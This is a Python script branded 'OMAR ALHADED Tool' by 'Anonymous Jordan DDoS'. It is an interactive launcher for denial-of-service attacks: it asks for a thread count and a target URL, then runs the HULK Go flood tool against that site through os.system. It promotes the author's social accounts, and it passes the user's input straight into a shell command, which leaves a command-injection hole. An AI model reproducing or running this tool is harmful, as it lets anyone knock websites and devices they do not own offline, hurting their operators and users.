from colorama import Fore, Back, Style
#print(Fore.RED + 'some red text')
#print(Back.GREEN + 'and with a green background')
#print(Style.DIM + 'and in dim text')
#print(Style.RESET_ALL)
#print('back to normal now')
import os
import pyttsx3
import sys
import platform
def say_stuff(stuff_to_say):
    engine = pyttsx3.init()
    engine.say(str(stuff_to_say))
    engine.runAndWait()
print(Fore.GREEN + Back.BLACK)
if str(platform.system()) == 'Linux':
      os.system('figlet OMAR ALHADED')
else:
    os.system('pyfiglet OMAR ALHADED')

print(Back.GREEN+Fore.GREEN+'[+] ALHADED tool by'+Fore.RED+'Anonymous Jordan DDoS') 
print(Back.GREEN+Fore.BLACK+'[+] OMAR ALHADED Tool Alfa VERSION 1.0')
print(Back.BLACK+Fore.GREEN+'[+] OMAR ALHADED Tool Interactive Menu in Python by ALHADEDH')
print(Fore.YELLOW + '[+] We are Anonymous, We are a Legion, We do not Forgive, We do not Forget')
print(Fore.GREEN + '[+] Starting OMAR ALHADED DoS Tool with 1024 Baseline Threads as Default change below as Required')
print(Fore.BLUE + 'instagram: ' + Fore.GREEN + 'https://www.instagram.com/seo_hosting1')
print(Fore.RED + 'Youtube: ' + Fore.GREEN + 'https://www.youtube.com/seo_hosting1')
print(Fore.YELLOW + 'Telegram: ' + Fore.GREEN + 'https://t.me/seo_hosting1')
print('Your OS:'+ Fore.RED + str(platform.system())+Fore.GREEN)
try:
    threads = input('[+] ENTER THE NUMBER OF' + Fore.BLUE + ' THREADS ' + Fore.GREEN + 'FOR DDoS Default [4000]  >>>')
    site = input(Fore.BLUE + '[+] Enter the Url Site that You want to' + Fore.RED + ' DDoS ' + Fore.GREEN + '>>>')
    colab_status = input(Fore.YELLOW + 'Are you DDoS with CloudFler Collab [Y/N] >>>')
    attack_severity = input('[+] Enter'+ Fore.RED +' 1'+Fore.GREEN+' For a Very Small'+Fore.RED+' Target'+Fore.GREEN+' Like a Device and' + Fore.YELLOW + ' 2 ' + Fore.GREEN +' for a ' + Fore.YELLOW + 'Website '+ Fore.GREEN + '  Default For Chat Jawal [ 2 ] >>>')
    if 'Y' == colab_status:
        print('OK, Now Not using Text-to-Speech to make ur Attack look' + Fore.RED+ ' Cool' + Fore.GREEN)
    if 'y' == colab_status:
        print('OK, Now Not using Text-to-Speech to make ur Attack look' + Fore.RED+ ' Cool' + Fore.GREEN)
    if 'n' == colab_status:
        if str(platform.system()) == 'Linux':
            print('[+] As You are on Linux, No, Text-to-Speech')
        else:
            say_stuff("Attacking your Target Website {0} with {1} Threads".format(site, threads))
    if 'N' == colab_status:
        if str(platform.system()) == 'Linux':
            print('[+] As you are on Linux, No, Text-to-Speech')
        else:
            say_stuff("Attacking your Target Website {0} with {1} Threads".format(site, threads))

    print('[+] Executing Command as Follows')
    print(Fore.GREEN +'HULKMAXPROCS={0} go run hulk.go -site {1}'.format(threads,site))
    if 'Windows' in str(platform.system()):
        os.system('go run hulk.go -site {0}'.format(site))
    else:
        os.system('HULKMAXPROCS={0} go run hulk.go -site {1}'.format(threads,site))
    print(Back.BLACK + Fore.GREEN)
    
except:
    print('[+] Execution Stopped with Error Code 0, Install GoLang or Your Internet is not working properly')
    print('[+] Installing Dependancies')
    os.system('python3 Install_Dependancies.py')
    os.system('python Install_Dependancies.py')
    os.system('py Install_Dependancies.py')